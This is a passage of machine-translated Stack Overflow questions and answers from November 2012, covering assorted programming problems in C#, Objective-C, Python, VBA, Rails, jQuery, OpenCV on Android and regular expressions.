所以，我犯了一个典型的菜鸟错误，并没有检查我包含在视图中的部分。在其中一个 link_to 路径上，我的名称有单数/复数错误。似乎是导致问题的路线。该死的rails错误代码！

# c# - 将 Visual Studio 项目文件解析为 XML

> ID：13353628
> 
> 赞同：2
> 
> 时间：2012-11-12T23:59:17.207
> 
> 标签：c#, xml, visual-studio-2012, dynamic-language-runtime, project-files

使用动态 xml 解析器，我正在尝试将 VS 项目文件加载为 XElement。这是项目文件的精简版本：

```
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
    <ItemGroup>
    </ItemGroup>
    <ItemGroup>
    </ItemGroup>
</Project> 
```

从某种意义上说，当我使用 ToString() 时，文件似乎已加载，我得到了内容。然而，当试图挑选元素时，什么也找不到：

```
XElement element;

public DynamicXmlParser( string fileName )
{
    element = XElement.Load( fileName );
}

public override bool TryGetMember( GetMemberBinder binder, out object result )
{
    result = null;
    if ( element == null ) return false;

    XElement subElement = element.Element( binder.Name );

    if ( subElement == null ) return false;

    result = new DynamicXmlParser( subElement );
    return true;
} 
```

subElement 始终为空。

`binder.Name`是`ItemGroup`

```
dynamic xmlDoc = new DynamicXmlParser( SampleFileName );
Debug.Pring(xmlDoc.ItemGroup.ToString()); 
```

但是，当我从 Project 节点中删除所有属性时， subElement 按预期变为 ItemGroup XElement。

当属性在项目节点中时，为什么我可以返回任何元素？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-13T00:06:30.183

您可能在要求空命名空间中的元素，为什么实际上这些元素存在于 xmlns="http://schemas.microsoft.com/developer/msbuild/2003" 中。看看 XNamespace。

例如尝试：

```
XNamespace msbuildNs = "http://schemas.microsoft.com/developer/msbuild/2003"
XElement subElement = element.Element(msbuildNs + binder.Name); 
```

# objective-c - CCMenuItemImage - setSelectedImage 和 setNormal Image

> ID：13353633
> 
> 赞同：0
> 
> 时间：2012-11-12T23:59:59.143
> 
> 标签：objective-c, ios, cocos2d-iphone

在使用 CCMenuItemImage 时遇到了这个问题。似乎我必须将 SelectedImage 和 NormalImage 设置为不同的 CCSprite，否则它会使我的应用程序崩溃。（我计划稍后在这两个州使用独特的资产） CCMenuItemImage *ItemButton; 已定义/初始化。

以下不起作用：

```
CCSprite *updatedSprite = [CCSprite spriteWithFile:@"1_button.png"];
[ItemButton setNormalImage:updatedSprite];
[ItemButton setSelectedImage:updatedSprite]; 
```

以下确实有效：

```
CCSprite *updatedSpriteNormal = [CCSprite spriteWithFile:@"1_button.png"];
[ItemButton setNormalImage:updatedSpriteNormal];

CCSprite *updatedSpriteSelected = [CCSprite spriteWithFile:@"1_button.png"];
[ItemButton setSelectedImage:updatedSpriteSelected]; 
```

很想知道为什么会发生这种情况，我做了一些挖掘，但找不到任何确定的东西。任何见解都会很棒。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T00:04:43.153

当您 setSelectedImage 时，精灵作为子项添加到 ItemButton，因此它有一个父项。您必须为 setNormalImage 创建 CCSprite 的第二个实例，因为 cocos2d 的节点层次结构将始终阻止将已经有父对象的对象添加为子对象。

# c# - 是否有通用 InkCanvas StrokesChanged 类型的事件？

> ID：13353637
> 
> 赞同：2
> 
> 时间：2012-11-13T00:00:15.690
> 
> 标签：c#, .net, wpf, events, inkcanvas

基本上我想要做的是为我的画布触发一种“脏”状态，以便我知道是否有未保存的更改。

**WPF InkCanvas 中是否有一个事件可以在笔画发生变化时随时处理？**

**如果没有，我应该听什么事件来获得等价物？**我的第一个猜测是：

```
StrokeCollected
StrokeErased
StrokesReplaced 
```

虽然我可能是错的，并且错过了一个边缘案例。

注意：如果我得到误报（实际上没有被标记为脏），这没什么大不了的，但我不想要误报。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-15T00:30:09.927

这些事件似乎可以完成这项工作：

*   `InkCanvas.StrokesReplaced`（在设置 Strokes 属性时发生）
*   `StrokeCollection.StrokesChanged`（在添加或删除笔画时发生）
*   `Stroke.StylusPointsChanged`（当笔画的形状改变时发生）
*   `Stroke.StylusPointsReplaced`（设置 StylusPoints 属性时发生）
*   `Stroke.DrawingAttributesChanged`（当笔画的属性改变时发生）
*   `Stroke.DrawingAttributesReplaced`（在设置 DrawingAttributes 属性时发生）

就我而言，我从不替换属性或更改绘图属性，所以我只使用`StrokeCollection.StrokesChanged`and `Stroke.StylusPointsChanged`。这是我的代码片段。

```
public MainWindow()
{
    inkCanvas.Strokes.StrokesChanged += Strokes_StrokesChanged;
}

private void Strokes_StrokesChanged(object sender, StrokeCollectionChangedEventArgs e)
{
    // Mark dirty
    foreach (Stroke stroke in e.Added)
    {
        stroke.StylusPointsChanged += stroke_StylusPointsChanged;
    }
    foreach (Stroke stroke in e.Removed)
    {
        stroke.StylusPointsChanged -= stroke_StylusPointsChanged;
    }
}

private void stroke_StylusPointsChanged(object sender, System.EventArgs e)
{
    // Mark dirty
} 
```

# c# - tableAdapter 的命令和设计器下面列出的查询有什么区别？

> ID：13353640
> 
> 赞同：0
> 
> 时间：2012-11-13T00:00:35.570
> 
> 标签：c#, winforms, ado.net

我有一个数据集，并且在每个 dataTable 下的设计器中都有一个表适配器。所以我可以添加->查询到数据表并选择一个存储过程，然后在下面的表适配器部分中列出。我还可以选择表适配器并将其选择/插入/更新/删除命令设置为存储过程。

我的问题是有什么区别，更重要的是，您如何知道何时调用查询或命令？（我需要知道，因为我可以以不同的方式配置参数，而那些参数不能正常工作）

例如，我怎么知道这是使用哪一个？

```
 private void saveToolStripButton_Click(object sender, EventArgs e)
    {
        this.Validate();
        this.permitInfoLinksBindingSource.EndEdit();
        this.linksTableAdapter.Update(this.dataSet1);
    } 
```

似乎以下内容正确地使用环境变量调用存储过程......但如果我尝试将`Environment.UserName.ToUpper()`“参数集合编辑器”放入 SourceColumn 下，它会发送 null 。

```
this.linksTableAdapter.spInsertLink(Environment.UserName.ToUpper(), fkPermitInfoID, 
fPath, ref ident); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T00:41:38.857

这段摘自[MSDN](http://msdn.microsoft.com/en-us/library/bz9tthwx%28v=vs.80%29.aspx)有帮助吗？

*TableAdapter 使用数据命令来读取和写入数据库。TableAdapter 的初始填充（主）查询用作创建关联数据表架构的基础，以及与 TableAdapter.Update 方法关联的 InsertCommand、UpdateCommand 和 DeleteCommand 命令。这意味着调用 TableAdapter 的 Update 方法会执行最初配置 TableAdapter 时创建的语句，而不是使用 TableAdapter 查询配置向导添加的其他查询之一。当您使用 TableAdapter 时，它可以使用您通常执行的命令有效地执行相同的操作。例如，当您调用适配器的 Fill 方法时，适配器会执行其 SelectCommand 属性中的数据命令并使用数据读取器（例如，SqlDataReader) 将结果集加载到数据表中。同样，当您调用适配器的 Update 方法时，它会为数据表中的每条更改记录执行适当的命令（在 UpdateCommand、InsertCommand 和 DeleteCommand 属性中）。*

据我了解，这些`*Command`是样板查询，而表下方的查询是您自己创建的更具体的自定义内容，以满足您更复杂的需求，因此如果您使用命令，则无法将更复杂的参数传递到查询中。

我也由此推测，当您调用更新等基本操作时，会执行默认命令，而不是之后定义的查询。

我只是简单地使用了tableadapter，而且我对它们的了解很浅（我一发现就转移到实体框架），所以这个回答之夜并不值得......

# python - 在 Mongodb $or 中计算匹配项

> ID：13353641
> 
> 赞同：0
> 
> 时间：2012-11-13T00:00:53.293
> 
> 标签：python, mongodb

试图计算所有列的匹配项。

我目前使用此代码从 Scrapy 项目中复制某些字段。

```
def getDbModel(self, item):
    deal = { "name":item['name'] }

    if 'imageURL' in item:
        deal["imageURL"] = item['imageURL']
    if 'highlights' in item:
        deal['highlights'] = replace_tags(item['highlights'], ' ')
    if 'fine_print' in item:
        deal['fine_print'] = replace_tags(item['fine_print'], ' ')
    if 'description' in item:
        deal['description'] = replace_tags(item['description'], ' ')
    if 'search_slug' in item:
        deal['search_slug'] = item['search_slug']
    if 'dealURL' in item:
        deal['dealurl'] = item['dealURL'] 
```

想知道如何将其变成 mongodb 中的 OR 搜索。

我在看类似下面的东西：

```
def checkDB(self,item): 
    # Check if the record exists in the DB
    deal = self.getDbModel(item)

    return self.db.units.find_one({"$or":[deal]}) 
```

首先，这是最好的方法吗？

其次，我将如何找到匹配列的数量，即尝试限制匹配至少两列的记录。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T11:06:21.913

没有简单的方法来计算 MongoDB 端的列匹配数，它只是有点匹配然后返回。

你可能会更好地做这个客户端，我不确定你打算如何使用这个计数数字但是没有简单的方法，无论是通过 MR 还是聚合框架来做这件事。

您可以在聚合框架中稍微更改架构以将这些列放在一个`properties`字段中，然后`$sum`将匹配项放在子文档中。这是一种很好的方法，因为您还可以对其进行排序以创建一种相关性搜索（如果这是您的意图）。

至于这是否是一个好方法取决于。当使用`$or`MongoDB 时，将为每个条件使用一个索引，这是 MongoDB 索引中的一种特殊情况，但这确实意味着您应该在制作时考虑到这一点，`$or`并确保您有涵盖每个条件的索引。

您还必须考虑到 MongoDB 将有效地评估每个子句，然后合并结果以删除重复项，这对于更大`$or`的 s 或大型工作集可能很重。

当然，您的 $or 格式是错误的，您需要一个字段数组的数组。此刻，您有一个数组和另一个数组，该数组具有您的所有属性。当像这样使用时，属性实际上会`$and`在它们之间有一个条件，所以它不会起作用。

您可能可以将代码更改为：

```
def getDbModel(self, item):
    deal = []
    deal[] = { "name":item['name'] }

    if 'imageURL' in item:
        deal[] = {"imageURL": tem['imageURL']}
    if 'highlights' in item:
        // etc

// Some way down
return self.db.units.find_one({"$or":deal}) 
```

注意：我不是 Python 程序员

希望能帮助到你，

# php - 在 Windows Server 2008、PLESK 中安装 PEAR

> ID：13353642
> 
> 赞同：1
> 
> 时间：2012-11-13T00:01:15.240
> 
> 标签：php, pear

我不是一个通常伸出手的人，但我发现自己完全被这个难住了。

我有一台新服务器并选择使用 Windows Server 2008 和 Plesk。导入我的网站后，我发现我的包含不再起作用，并出现以下错误消息：

require_once(include/online_class.php) [function.require-once]：打开流失败：不允许操作

致命错误：require_once() [function.require]：无法打开所需的“include/online_class.php”

我已禁用 open_basedir 以确保它不冲突，但我仍然收到此消息。我尝试通过命令行重新安装 PEAR，并确保 include_path 指向正确的目录 -> C:\Program Files (x86)\Parallels\Plesk\Additional\PleskPHP5\PEAR

我在 PHP 5.2 和 5.3 之间切换 - 5.3 只会显示 500 错误消息，甚至不会到达 php 包含错误。

我在这里缺少什么吗？这是我在使用 linux / cpanel 构建时从未遇到过的问题，而且对于 Windows 服务器，它在我的嘴里留下了酸涩的味道。我能做些什么来解决这个问题？

任何帮助，将不胜感激。干杯!

# javascript - Jquery 插件在 URL 中创建不需要的 #

> ID：13353643
> 
> 赞同：0
> 
> 时间：2012-11-13T00:01:32.840
> 
> 标签：javascript, jquery, url

我有一小段 javascript 来支持几个功能，例如我的 jquery 滑块上的导航。最近我注意到，当您单击导航按钮时，它会执行预期的操作，但还会在 URL“#”中创建一个额外的字符。我检查了脚本并找到了添加它的位置和原因，但是单击导航时未添加如何修复它，我不知道。有没有人可以帮助或至少指出我正确的方向。请看下面的完整代码

```
var fadeTimer;
var slideSpeed = 8000;
jQuery(document).ready(function() {
// add nav buttons
var slideCount = jQuery('#fader ul li').length;

var randomnumber=Math.floor(Math.random()* slideCount);

for ($i = 0; $i < slideCount; $i++) {
jQuery('#faderNav').prepend('<a href="#"><\/a>');
}

jQuery('#faderNav a').eq(randomnumber).addClass('active');
jQuery('#fader ul li').eq(randomnumber-1).addClass('active');

var next = jQuery('#fader ul .active').next();
if (next.length > 0) {

} else {
var next = jQuery('#fader ul li:first');
}

jQuery('#fader ul .active').fadeOut().removeClass('active');
next.fadeIn().addClass('active');

// work out nav width
var navBtn = jQuery('#faderNav a');
var navBtnWidth = navBtn.outerWidth(true);
var navWidth = navBtn.length * navBtnWidth;
// set nav width
jQuery('#faderNav').width(navWidth);
// add negative margin to center the nav
var negMarg = navWidth / 2;
jQuery('#faderNav').css({'margin-left':'-'+negMarg+'px'});

// start timer

var fadeTimer = setInterval("faderTimer()", slideSpeed);

jQuery('#faderNav a').live('click',function() {
clearInterval(fadeTimer);
var index = jQuery(this).index('#faderNav a');
jQuery('#faderNav a').removeClass('active');
jQuery('#faderNav a').eq(index).addClass('active');
jQuery('#fader ul .active').fadeOut().removeClass('active');
jQuery('#fader ul li').eq(index).fadeIn('slow').addClass('active');
});
});

// FADE FUNCTION
function faderTimer() {
var next = jQuery('#fader ul .active').next();
if (next.length > 0) {

} else {
var next = jQuery('#fader ul li:first');
}

var navIndex = next.index('#fader ul li');
jQuery('#faderNav a').removeClass('active');
jQuery('#faderNav a').eq(navIndex).addClass('active');
jQuery('#fader ul .active').fadeOut().removeClass('active');
next.fadeIn('slow').addClass('active');

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T00:06:03.977

```
$(document).on("click", "a[href=#]", function(e) {
    e.preventDefault();
}); 
```

[http://jsfiddle.net/RhNDB/show/](http://jsfiddle.net/RhNDB/show/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T00:06:05.987

单击锚点`href="#"`会将哈希符号添加到 url。

使用 preventDefault 或返回 false：

```
jQuery(document).on('click', '#faderNav a', function(e) {
    e.preventDefault();
    clearInterval(fadeTimer);
    var index = jQuery(this).index('#faderNav a');
    jQuery('#faderNav a').removeClass('active');
                         .eq(index).addClass('active');
    jQuery('#fader ul .active').fadeOut().removeClass('active');
    jQuery('#fader ul li').eq(index).fadeIn('slow').addClass('active');
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-13T00:06:20.023

`return false;`在处理程序的末尾添加一个`click`。这将阻止页面导航到`href`属性的值。

# java - 使用 Eclipse 为 Android 构建原生 Opencv 会给出“对 `cvCreateFileCapture' 的未定义引用”

> ID：13353647
> 
> 赞同：0
> 
> 时间：2012-11-13T00:02:19.170
> 
> 标签：java, android, eclipse, opencv, java-native-interface

我正在开发一个带有原生部分的应用程序，它使用嵌入式 OpenCV 从视频文件中提取帧。到目前为止，我收到此错误：

```
.../jni/ocv.c:12: undefined reference to `cvCreateFileCapture' 
```

我的安卓.mk：

```
LOCAL_PATH := $(call my-dir)

include $(CLEAR_VARS)

LOCAL_MODULE    := ocv
LOCAL_SRC_FILES := ocv.c

include $(BUILD_SHARED_LIBRARY) 
```

应用程序.mk：

```
APP_STL := gnustl_static
APP_CPPFLAGS := -frtti -fexceptions
APP_ABI := armeabi 
```

ocv.c：

```
#include <string.h>
#include <jni.h>
#include <stdio.h>
#include <dlfcn.h>
#include <opencv/cv.h>
#include <opencv/highgui.h>

jstring Java_com_ice_salvador_MainActivity_invokeNativeFunction(JNIEnv* env, jobject javaThis) {
    IplImage* currFrame = 0;
    CvCapture* cap = 0;

    cap = cvCaptureFromFile("/mnt/sdcard/vvv.3gp"); //test video

    return (*env)->NewStringUTF(env, "Hello from native code!");
} 
```

我正在使用 OpenCV-2.4.3-android-sdk、Android NDK r8b、Eclipse Juno、Windows。

`IplImage`,`CvCapture`得到解决，如果我用 - 删除该行，代码就会编译，`cvCaptureFromFile`所以我假设我走对了。我是 JNI 和 OpenCV 的新手。感谢你的帮助！谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T21:56:37.533

不要让我自己的问题没有答案..

1) 我已更改 Android.mk 以包含来自 SDK 的 OpenCV.mk 并将 .so lib 包含到构建中：

```
LOCAL_PATH := $(call my-dir)

include $(CLEAR_VARS)

include c:\dev\OpenCV-2.4.3-android-sdk\sdk\native\jni\OpenCV.mk

LOCAL_MODULE    := ocv
LOCAL_SRC_FILES := ocv.c
LOCAL_LDLIBS += -Lc:\dev\OpenCV-2.4.3-android-sdk\sdk\native\libs\armeabi

include $(BUILD_SHARED_LIBRARY)

#LOCAL_PATH := /home/spatialite/jni
include $(CLEAR_VARS)
LOCAL_MODULE := libopencv_java
LOCAL_SRC_FILES := libopencv_java.so
include $(PREBUILT_SHARED_LIBRARY) 
```

2) 将 libopencv_java.so 复制到 jni/ 文件夹。

3）将java代码更改为：

```
static {
  System.loadLibrary("opencv_java");
  System.loadLibrary("ocv");
} 
```

并且错误消失了。

# rubymotion - 如何使用 Interface builder 和 Rubymotion。工作流程

> ID：13353648
> 
> 赞同：0
> 
> 时间：2012-11-13T00:02:25.707
> 
> 标签：rubymotion

我正在使用 Rubymotion 构建一个 iOS 应用程序。我在 Interfaceb Builder 的帮助下构建 UI。在我正在处理的屏幕中，我得到了以下元素：

1.  导航栏
2.  标签
3.  表视图

我正在通过 API 调用填充表格视图。一切正常，但我不确定我正在做我应该做的事情。据我所知，IB 仅用于“绘制” UI 而不是对其进行编码，仅此而已？

这是我的控制器代码。同样，它工作正常，但我认为我没有遵循“最佳实践”。

[http://pastie.org/5368976](http://pastie.org/5368976)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-14T02:16:46.240

有许多不同的方法可以确定您希望如何构建视图。

如果您没有做大量定制设计的 UI，那么我不明白为什么我不会使用像[@colinta's Teacup 这样的](https://github.com/colinta) [东西](https://github.com/rubymotion/teacup)。

我会避免使用故事板来构建 UI。请在[此处](https://groups.google.com/d/msg/rubymotion/eullUwYr23U/5DjdXFPew9QJ)查看主题。

关于这一点，如果您在 SO 上找不到答案，请不要犹豫，查看[Ruby Motion Google Group上的讨论。](https://groups.google.com/forum/#!forum/rubymotion)该小组似乎非常活跃。

此外，IRC：irc.freenode.net，#rubymotion

# objective-c - iOS6 NSMutableAttributedString addAttribute:value:range: 不工作

> ID：13353650
> 
> 赞同：1
> 
> 时间：2012-11-13T00:02:30.450
> 
> 标签：objective-c, ios6, xcode4.5, nsattributedstring

我的环境：Xcode 4.5.2、iOS 6.0 SDK

起初，我使用 IB 用 UITextView 和 Attribuded String 做了一个简单的项目。 ![在此处输入图像描述](../Images/5e7d4c49205a4efc2320abc95a86d5a7.png) 然后，运行 iOS 模拟器，工作正常。 ![在此处输入图像描述](../Images/fb8836aedcb01f9db98a81fb7c182a8c.png)

其次，我尝试通过绳索使用属性。代码是这样的。

视图控制器.h：

```
@property (strong, nonatomic) IBOutlet UITextView *textView; 
```

视图控制器.m：

```
[super viewDidLoad];

UIFont *font = [UIFont systemFontOfSize:14.0f];
NSMutableDictionary *attrsDictionary = [NSMutableDictionary dictionaryWithObject:font forKey:NSFontAttributeName];

NSMutableParagraphStyle *paragraphStyle = [[NSParagraphStyle defaultParagraphStyle] mutableCopy];
[attrsDictionary setObject:paragraphStyle forKey:NSParagraphStyleAttributeName];

NSString *text = @"In iOS 6 and later, this class supports multiple text styles through use of the attributedText property.";

NSMutableAttributedString *attributedText = [[NSMutableAttributedString alloc] initWithString:text attributes:attrsDictionary];

NSRange range = NSMakeRange(3, 5); // range of "iOS 6"
[attributedText addAttribute:NSForegroundColorAttributeName value:[UIColor colorWithRed:0.262745 green:0.262745 blue:0.262745 alpha:1] range:range];

self.textView.attributedText = attributedText; 
```

结果无法正常工作。 ![在此处输入图像描述](../Images/66a409f582cf15b5a52da995e3eaeafa.png)

所以，我试图获取日志。

```
NSLog(@"%@", self.textView.attributedText);

In {
    NSColor = "UIDeviceRGBColorSpace 0 0 0 1";
    NSFont = "<UICFFont: 0x716eef0> font-family: \".Helvetica NeueUI\"; font-weight: normal; font-style: normal; font-size: 14px";
    NSKern = 0;
    NSParagraphStyle = "Alignment 4, LineSpacing 0, ParagraphSpacing 0, ParagraphSpacingBefore 0, HeadIndent 0, TailIndent 0, FirstLineHeadIndent 0, LineHeight 0/0, LineHeightMultiple 0, LineBreakMode 0, Tabs (\n), DefaultTabInterval 36, Blocks (null), Lists (null), BaseWritingDirection 0, HyphenationFactor 0, TighteningFactor 0, HeaderLevel 0";
    NSStrokeColor = "UIDeviceRGBColorSpace 0 0 0 1";
    NSStrokeWidth = 0;
}iOS 6{
    NSColor = "UIDeviceRGBColorSpace 0.262745 0.262745 0.262745 1";
    NSFont = "<UICFFont: 0x716eef0> font-family: \".Helvetica NeueUI\"; font-weight: normal; font-style: normal; font-size: 14px";
    NSKern = 0;
    NSParagraphStyle = "Alignment 4, LineSpacing 0, ParagraphSpacing 0, ParagraphSpacingBefore 0, HeadIndent 0, TailIndent 0, FirstLineHeadIndent 0, LineHeight 0/0, LineHeightMultiple 0, LineBreakMode 0, Tabs (\n), DefaultTabInterval 36, Blocks (null), Lists (null), BaseWritingDirection 0, HyphenationFactor 0, TighteningFactor 0, HeaderLevel 0";
    NSStrokeColor = "UIDeviceRGBColorSpace 0.262745 0.262745 0.262745 1";
    NSStrokeWidth = 0;
} and later, this class supports multiple text styles through use of the attributedText property.
... 
```

似乎 addAttribute: 方法工作正常。但不显示...为什么？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-26T09:21:10.313

我相信您对故事板的工作方式感到困惑......您在故事板中设置属性文本，然后尝试更改它的代码。根据我的经验......你做一个或另一个。我有一个表单，我在 Storyboard 中设置了带有属性的文本，它在模拟器和应用程序上都可以正常工作。但是，我不会试图覆盖我已经在情节提要中所做的事情。如果您在情节提要中创建了一些东西，它就完成了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-29T17:42:28.467

也许你需要在你的文本视图上调用 setNeedsDisplay ？

# excel - 如何在 VBA/宏中为生日通知创建代码？

> ID：13353652
> 
> 赞同：-3
> 
> 时间：2012-11-13T00:02:38.030
> 
> 标签：excel, vba

例如，我有一张包含 100 多人姓名的表格。在 HI 栏中有他们的出生日期。如果我想知道今天是哪个朋友的生日，代码会是什么样子？当然，宏需要遍历该列并查看今天的日期是否与 H 列中的日期匹配。我对 VBA/宏的经验很少。请并感谢您的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T00:47:59.140

如果某人的生日是今天，则此代码将根据 H 列在 I 列上显示一条消息。（假设 G 列有人名。

```
Sub BirthdayAlert()
Dim lastRow As Long
Dim ws As Worksheet
Dim varArray As Variant
Dim lb As Long
Dim i As Integer

    Set ws = Sheets("Sheet1")
    lastRow = ws.Range("H" & Rows.Count).End(xlUp).Row
    varArray = Application.Transpose(ws.Range("H2:H" & lastRow).Value)
    lb = LBound(varArray)

    For i = LBound(varArray) To UBound(varArray)
        If IsDate(varArray(i)) Then
           If CDate(varArray(i)) = Date Then
              varArray(i) = "Today is Your Birthday " & Range("G2").Offset(i).Value
            Else
                varArray(i) = ""
           End If
        End If
    Next i

    If UBound(varArray) > 0 Then
        ws.Range("I2:I" & lastRow).Value = Application.Transpose(varArray)
    End If
End Sub 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T02:37:11.630

这里有一些简单的东西：

```
Sub birthdayThing()
    Dim rng As Range

    For Each rng In Range("H2:H100")
       If CDate(rng) = Date Then rng.Offset(0, 1).Value = "Birthday"
    Next rng
End Sub 
```

# python - Python字符串困难

> ID：13353654
> 
> 赞同：2
> 
> 时间：2012-11-13T00:02:57.657
> 
> 标签：python, string

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T00:16:57.023

欢迎来到堆栈溢出！我们很乐意帮助您解决您可能遇到的任何编程问题。但是，我们不是家庭作业资源。你的大学无疑有这些。由于这个问题需要家庭作业方面的帮助，因此您不会得到“即插即用”之类的答案。相反，我们将通过指出您提供给我们的事实并提出引导性问题来促使您朝着正确的方向前进。

此外，您的问题似乎是重复的。在向我们提出问题之前，您应该认真审视一下。

首先，您的信息似乎被每个学生的空格/换行符分割。似乎这些块中的每一个都包含 1 个人的信息，因此沿着这些线拆分可能是有意义的。如果您已经掌握了`classes`课程，这可能是一个考虑使用*不同值存储**相同类型信息*的方法的好地方。否则，您可能会考虑其他数据类型，例如、或。*`lists``sets``dictionaries`*

 *似乎您想存储可以通过*名称*查找的*值*。Python 内置的 'dict' 类型和 'class' 系统非常擅长这一点！或者，列表中的课程名称和成绩元组可以轻松执行相同的任务。

 ** * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T00:20:20.363

当您打电话时，`string.split('$')`您将拆分整个字符串，而不仅仅是一行。另外，当你说`student == Justin`or `subject == Calculus`python 试图找到一个名为`Justin`or的变量时`Calculus`。

我建议使用交互式 python 解释器来尝试这些事情。

```
 >>> a = '''
   ... Jstin$Calculus$90$Java$85$Python88$
   ... Taylor$Calculus$73$Java$95$Python86$
   ... Drew$Calculus$80$Java$75$Python94$
   ... '''

   >>> a.split('$')
   ['\nJustin', 'Calculus', '90', 'Java', '85', 'Python88', '\nTaylor', 'Calculus',
  '73', 'Java', '95', 'Python86', '\nDrew', 'Calculus', '80', 'Java', '75', 'Pyth
on94', '\n']
   >>> b = 'Justin'
   >>> if b == Justin:
   ...  print 'yes'
   ...
   Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  NameError: name 'Justin' is not defined 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-13T00:27:27.653

```
#!/usr/bin/env python

string = '''
Justin$Calculus$90$Java$85$Python88$
Taylor$Calculus$73$Java$95$Python86$
Drew$Calculus$80$Java$75$Python94$
'''

def findScore(student,subject) :
    global string
    students = [i for i in string.split('\n') if i]    # non-empty strings only
    for i in students :
        parts = i.split('$')
        if parts[0] == student :
            for j in range(1,len(parts),2) :
                if parts[j] == subject :
                    print student, 'got', parts[j+1], 'in', parts[j]

findScore( 'Justin', 'Java' ) 
```**

# ruby-on-rails - 带有块的 CanCan 会授予 Class 权限吗？

> ID：13353656
> 
> 赞同：0
> 
> 时间：2012-11-13T00:03:04.550
> 
> 标签：ruby-on-rails, cancan

我的能力课上有这样的东西

```
def initialize(staff)
   staff ||= Staff.new
   can :manage, Store do |store|
      store.staff_privileges.select(&:owner?).map(&:staff_id).include? staff.id
   end
end 
```

我不确定为什么`staff.can? :manage`会在这里返回 true，因为我认为上面的块应该只在 store 的实例上执行，而不是在类本身上执行

```
staff = Staff.first
staff.can? :manage, Store #true
staff.can? :manage, Store.first #false, because there is no staff_privileges associated to this store 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T02:12:26.277

来自[https://github.com/ryanb/cancan/wiki/Defining-Abilities-with-Blocks](https://github.com/ryanb/cancan/wiki/Defining-Abilities-with-Blocks)

```
The block is only evaluated when an actual instance object is present. It is not evaluated when checking permissions on the class (such as in the index action). This means any conditions which are not dependent on the object attributes should be moved outside of the block. 
```

为什么会这样？我不知道，但我认为答案在“例如在索引操作中”位中？如果没有这种行为，cancan 提供的 load_and_authorize_resource 方法将无法用于索引操作。

# performance - 压缩图像是否会使图像使用更少的内存？

> ID：13353661
> 
> 赞同：4
> 
> 时间：2012-11-13T00:03:47.493
> 
> 标签：performance, image, ipad, web, compression

这是关于系统（特别是网络浏览器）如何处理压缩图像的架构/概念问题。

我们正在处理一个工作中的“图片库”网络应用程序，该应用程序在一个页面上有 11 个 1920x1080 的图像，您可以在 iPad 上滑动浏览。我们发现它非常慢，我几乎可以肯定这是因为 iPad 无法同时在内存和页面上拥有如此多的大图像。

有些人建议我们更多地压缩图像；他们目前是 PNG，他们想将它们重新压缩为 JPG。显然文件大小会更小，但除非 iPad（和其他人）有办法直接将压缩图像渲染到屏幕（帧缓冲区），否则我认为他们必须在渲染之前将图像解压缩到内存中. 在这种情况下，压缩似乎不会影响渲染它们的性能。（除了“更多”解压缩它们的轻微增加处理能力。）

我的理解和假设是否正确？我们应该调整大小还是重新压缩图像？

谢谢

更多信息 - 在你告诉我“是的压缩图像更小”之前阅读此内容 - 我是开发人员，而不是用户：

使用更少的空间与使用更少的内存不同。我们没有存储问题，我们遇到了渲染性能问题。代码很简单，只是在一个 div 和下一个 div 之间进行动画处理，为画廊提供“滑动”效果。

当我们从方程中删除图像时，性能很好；所以我相当确定瓶颈是图像，而不是代码。

被问到的问题是“压缩是否会使图像使用更少的内存”，因为其他人希望更多地压缩图像以获得性能。据我了解压缩的架构，您仍然必须将其解压缩到内存中的原始大小才能使用它，因此压缩不会影响内存使用；只有存储和传输。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-13T00:35:03.047

> 压缩图像是否会使图像使用更少的内存？

不，如果图像显示在监视器上，将使用相同数量的内存（像素）。

压缩适用于图像的容器，通常是文件或临时内存缓冲区，但在屏幕上使用相同。

这是因为您需要分配要显示的每个像素。

对于 24 位的 1920x1080 图像，它将使用 1920 x 1080 x 3 字节（RGB 中每个颜色分量一个字节 -> 1 字节 = 8 位），或 6,220,800 字节（大约 6 mb）。

> 你应该重新压缩吗？

显示时它不会占用更少的内存空间，但可以更快地加载*到*内存中。但仅此而已。

现在应用程序需要决定是仅在显示图像时解压缩（这将导致延迟）还是全部解压缩并能够立即显示它们。此决定是基于应用程序的，因此您需要检查特定的应用程序。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T00:35:46.960

我不能专门针对 iOS 说话，但最好的办法是将解压缩卸载到 GPU 上，这需要一些相当复杂的架构工作。所以我认为使用更高的压缩比不太可能真正提高应用程序的性能。

但是，将图像拆分为较小的图块是我建议您尝试的常见解决方案。

# regex - 什么是只允许大写/小写（字母字符）、句点、空格和破折号的正则表达式？

> ID：13353663
> 
> 赞同：41
> 
> 时间：2012-11-13T00:03:53.733
> 
> 标签：regex

我在创建正则表达式验证器时遇到问题，该验证器检查以确保输入仅包含大写或小写字母字符、空格、句点、下划线和破折号。无法通过搜索在线找到此示例。例如：

这些都可以：

```
Dr. Marshall
sam smith
.george con-stanza .great
peter.
josh_stinson
smith _.gorne 
```

任何包含其他字符的东西都不行。那是数字，或任何其他符号。

* * *

## 回答 #1

> 赞同：96
> 
> 时间：2012-11-13T00:04:58.803

您正在寻找的正则表达式是`^[A-Za-z.\s_-]+$`

*   `^`断言正则表达式必须在主题的开头匹配
